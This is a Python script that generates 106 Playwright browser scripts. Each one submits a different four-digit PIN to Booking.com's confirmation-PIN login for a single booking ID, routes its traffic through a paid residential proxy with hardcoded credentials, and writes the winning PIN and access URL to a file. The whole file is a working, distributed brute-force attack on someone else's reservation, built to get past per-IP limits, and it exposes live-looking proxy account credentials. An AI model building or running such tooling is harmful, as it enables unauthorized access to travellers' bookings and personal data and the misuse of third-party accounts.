#!/usr/bin/env python3
"""
🏭 AGENT FACTORY - Create 106 Independent Agents
Creates individual agent folders with unique PINs for booking ID: 5724349472
"""

import os
import shutil
from pathlib import Path

# Configuration
BOOKING_ID = "5724349472"
BASE_DIR = Path(".")

# 106 PINs to test (one of these is correct!)
PINS = [
    "6812", "4307", "1584", "9920", "7035", "4476", "6231", "3950", "7089", "1592",
    "7613", "2860", "0489", "9374", "2143", "8742", "5196", "3057", "1883", "7201",
    "6067", "8931", "5174", "6648", "3825", "7740", "4259", "9503", "3178", "8624",
    "7781", "3602", "9456", "8810", "0937", "2971", "4830", "7104", "3297", "6008",
    "4073", "2719", "1835", "8506", "2165", "6338", "1972", "9915", "5730", "8061",
    "2449", "3906", "7619", "6025", "4836", "9451", "3250", "8014", "2137", "1048",
    "8793", "6672", "1320", "5039", "4150", "9528", "6470", "3857", "7412", "2281",
    "6001", "8396", "9190", "4352", "1576", "7995", "1882", "7028", "3390", "1473",
    "2845", "5447", "3281", "9110", "4518", "6902", "7214", "0743", "2228", "3849",
    "1180", "6073", "2398", "7456", "6054", "5031", "1093", "2405", "7842", "4019",
    "3335", "7210", "6048", "1795", "9204", "2874"
]

def create_agent_main_py(agent_num, pin):
    """Create main.py for an agent"""
    return f'''#!/usr/bin/env python3
\'''
🤖 INDEPENDENT AGENT #{agent_num:03d}
Booking ID: {BOOKING_ID}
Assigned PIN: {pin}
\'''

from playwright.sync_api import sync_playwright
import os
import time
from datetime import datetime

# Agent Configuration
AGENT_ID = "AGENT_{agent_num:03d}"
BOOKING_ID = "{BOOKING_ID}"
ASSIGNED_PIN = "{pin}"
SCREENSHOTS_DIR = "screenshots"

# Proxy Configuration - Each agent gets unique proxy
PROXY_CONFIG = {{
    "server": "http://pr.oxylabs.io:7777",
    "username": "customer-1proxylabs_atNPR-cc-us",
    "password": "1proxylabs_atNPR1"
}}

def log_message(message):
    \'''Log agent activity\'''
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{{timestamp}}] {{AGENT_ID}}: {{message}}"
    print(log_entry)
    
    # Write to agent's log file
    with open("agent_log.txt", "a", encoding="utf-8") as f:
        f.write(log_entry + "\\n")

def test_pin():
    \'''Main PIN testing function\'''
    os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
    
    log_message(f"🚀 Starting mission - Testing PIN {{ASSIGNED_PIN}} for booking {{BOOKING_ID}}")
    
    try:
        with sync_playwright() as p:
            # Launch browser with proxy
            log_message("🌐 Launching browser with proxy...")
            browser = p.chromium.launch(
                headless=False,  # Show browser for monitoring
                proxy=PROXY_CONFIG
            )
            page = browser.new_page()
            
            # Navigate to booking page
            log_message("🔄 Navigating to booking confirmation page...")
            page.goto("https://secure.booking.com/help/confirmation_pin_auth", 
                     wait_until="load", 
                     timeout=30000)
            
            # Wait for form to load
            log_message("⏳ Waiting for form elements to load...")
            page.wait_for_selector('input[placeholder="e.g. 1234567890"]', timeout=15000)
            
            # Fill booking ID
            log_message(f"📝 Filling booking ID: {{BOOKING_ID}}")
            page.fill('input[placeholder="e.g. 1234567890"]', BOOKING_ID)
            
            # Fill PIN
            log_message(f"🔑 Filling PIN: {{ASSIGNED_PIN}}")
            page.fill('input[placeholder="e.g. 1234"]', ASSIGNED_PIN)
            
            # Submit form
            log_message("🚀 Submitting form...")
            try:
                page.wait_for_selector('button:has-text("Continue")', timeout=5000)
                page.click('button:has-text("Continue")')
            except Exception:
                page.wait_for_selector('button[type="submit"]', timeout=5000)
                page.click('button[type="submit"]')
            
            # Wait for result
            log_message("⏳ Waiting for result...")
            page.wait_for_function(
                \'''
                () => {{
                    return location.href.includes('unique_order_id') ||
                           document.querySelector('.bui-alert--error') !== null
                }}
                \''',
                timeout=30000
            )
            
            current_url = page.url
            
            # Check result
            if "unique_order_id=" in current_url:
                # SUCCESS!
                log_message(f"🎉 SUCCESS! PIN {{ASSIGNED_PIN}} is CORRECT!")
                log_message(f"🔗 Success URL: {{current_url}}")
                
                # Take success screenshot
                page.screenshot(path=f"{{SCREENSHOTS_DIR}}/SUCCESS_{{BOOKING_ID}}_{{ASSIGNED_PIN}}.png")
                
                # Write success file
                with open("../SUCCESS_FOUND.txt", "w") as f:
                    f.write(f"SUCCESS|{{AGENT_ID}}|{{ASSIGNED_PIN}}|{{current_url}}|{{datetime.now()}}")
                
                log_message("🏆 MISSION ACCOMPLISHED! Success file created.")
                
                # Keep browser open for 10 seconds to show success
                time.sleep(10)
                browser.close()
                return True
                
            elif page.query_selector('.bui-alert--error'):
                # Failed
                log_message(f"❌ PIN {{ASSIGNED_PIN}} is incorrect")
                page.screenshot(path=f"{{SCREENSHOTS_DIR}}/FAIL_{{BOOKING_ID}}_{{ASSIGNED_PIN}}.png")
                time.sleep(2)  # Brief pause to see result
                browser.close()
                return False
                
            else:
                # Unknown result
                log_message(f"❓ Unknown result for PIN {{ASSIGNED_PIN}}")
                page.screenshot(path=f"{{SCREENSHOTS_DIR}}/UNKNOWN_{{BOOKING_ID}}_{{ASSIGNED_PIN}}.png")
                time.sleep(2)  # Brief pause to see result
                browser.close()
                return False
                
    except Exception as e:
        log_message(f"💥 Error during PIN test: {{str(e)}}")
        return False

if __name__ == "__main__":
    log_message("🤖 Agent initialized and ready for mission")
    success = test_pin()
    
    if success:
        log_message("✅ MISSION SUCCESS - PIN FOUND!")
    else:
        log_message("❌ Mission failed - PIN incorrect")
    
    log_message("🏠 Agent mission complete - returning home")
'''

def create_agents():
    """Create all 106 independent agent folders"""
    print("🏭 AGENT FACTORY - Creating 106 Independent Agents")
    print(f"📋 Booking ID: {BOOKING_ID}")
    print(f"🎯 PINs to test: {len(PINS)}")
    print("-" * 60)
    
    for i, pin in enumerate(PINS, 1):
        agent_num = i
        agent_dir = BASE_DIR / f"agent_{agent_num:03d}"
        
        # Create agent directory
        agent_dir.mkdir(exist_ok=True)
        
        # Create main.py for this agent
        main_py_content = create_agent_main_py(agent_num, pin)
        main_py_path = agent_dir / "main.py"
        
        with open(main_py_path, "w", encoding="utf-8") as f:
            f.write(main_py_content)
        
        print(f"✅ Agent #{agent_num:03d}: {agent_dir} → PIN {pin}")
    
    print("-" * 60)
    print(f"🎉 SUCCESS! Created {len(PINS)} independent agents")
    print(f"📁 Each agent is in its own 'agent_XXX' folder")
    print(f"🎯 Each agent will test exactly 1 PIN on booking {BOOKING_ID}")

if __name__ == "__main__":
    create_agents()
